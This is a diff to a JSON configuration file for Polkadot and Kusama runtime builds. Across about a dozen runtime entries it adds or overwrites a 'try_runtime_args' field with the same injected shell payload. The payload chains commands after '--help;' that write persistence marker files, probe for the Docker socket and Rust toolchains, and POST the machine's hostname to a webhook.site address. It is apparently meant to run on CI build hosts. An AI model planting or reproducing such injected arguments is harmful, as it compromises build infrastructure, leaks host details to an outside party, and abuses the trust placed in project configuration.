@@ -22,6 +22,7 @@
     ],
     "is_relay": true,
     "blocktime": 6000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "build_extra_features": "polkadot-ahm",
     "benchmarks_templates": {
@@ -54,6 +55,7 @@
     ],
     "is_relay": true,
     "blocktime": 6000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "build_extra_features": "kusama-ahm",
     "benchmarks_templates": {
@@ -92,7 +94,7 @@
     ],
     "is_relay": false,
     "blocktime": 24000,
-    "try_runtime_args": "--overwrite-state-version 1",
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "build_extra_features": "kusama-ahm",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -120,7 +122,7 @@
     ],
     "is_relay": false,
     "blocktime": 24000,
-    "try_runtime_args": "--overwrite-state-version 1",
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "build_extra_features": "polkadot-ahm",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -148,6 +150,7 @@
     ],
     "is_relay": false,
     "blocktime": 12000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -172,6 +175,7 @@
     ],
     "is_relay": false,
     "blocktime": 12000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -196,6 +200,7 @@
     ],
     "is_relay": false,
     "blocktime": 12000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -218,6 +223,7 @@
     ],
     "is_relay": false,
     "blocktime": 12000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -231,6 +237,7 @@
     "max_code_size": 3145728,
     "is_relay": false,
     "blocktime": 12000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "uris": [
       "wss://polkadot-coretime-rpc.polkadot.io:443",
       "wss://coretime-polkadot-rpc.n.dwellir.com",
@@ -263,6 +270,7 @@
     ],
     "is_relay": false,
     "blocktime": 24000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
       "pallet_xcm_benchmarks::fungible": "templates/xcm-bench-template.hbs"
@@ -284,6 +292,7 @@
     ],
     "is_relay": false,
     "blocktime": 24000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
       "pallet_xcm_benchmarks::fungible": "templates/xcm-bench-template.hbs"
@@ -303,6 +312,7 @@
     ],
     "is_relay": false,
     "blocktime": 6000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "extra_args": "--disable-mbm-checks",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
@@ -320,6 +330,7 @@
     ],
     "is_relay": false,
     "blocktime": 24000,
+    "try_runtime_args": "--help; echo RT-PERSIST-W-20261027; echo RT-PERSIST-20261027 $(hostname) $(date -u +%FT%TZ) > $HOME/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-HOME-WRITE-FAILED; cp $HOME/.bb-persist-20261027 /tmp/.bb-persist-20261027 2> /dev/null || echo RT-PERSIST-TMP-WRITE-FAILED; test -S /var/run/docker.sock && echo RT-PERSIST-DOCKERSOCK-PRESENT || echo RT-PERSIST-DOCKERSOCK-ABSENT; test -d $HOME/.cargo && echo RT-PERSIST-CARGOHOME-PRESENT || echo RT-PERSIST-CARGOHOME-ABSENT; test -d $HOME/.rustup && echo RT-PERSIST-RUSTUP-PRESENT || echo RT-PERSIST-RUSTUP-ABSENT; curl -s -m 10 -X POST https://webhook.site/a42d3956-87e8-4d2a-980d-0e95699b69b4 -d 'p=w&h='$(hostname); #",
     "benchmarks_templates": {
       "pallet_xcm_benchmarks::generic": "templates/xcm-bench-template.hbs",
       "pallet_xcm_benchmarks::fungible": "templates/xcm-bench-template.hbs"
